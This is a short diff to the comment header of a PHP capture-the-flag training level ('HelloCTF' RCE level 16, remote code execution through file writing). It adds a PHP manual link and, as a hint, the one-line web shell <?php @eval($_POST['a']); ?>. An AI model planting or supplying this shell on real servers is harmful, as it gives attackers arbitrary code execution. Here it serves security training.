@@ -9,6 +9,11 @@
 
 --- HelloCTF - RCE靶场 关卡 16 :  文件写入导致的RCE --- 
 
+https://www.php.net/manual/zh/function.file-put-contents.php
+
+参考可以写入的内容：
+<?php @eval($_POST['a']); ?>
+
 */
 
 function helloctf($code){
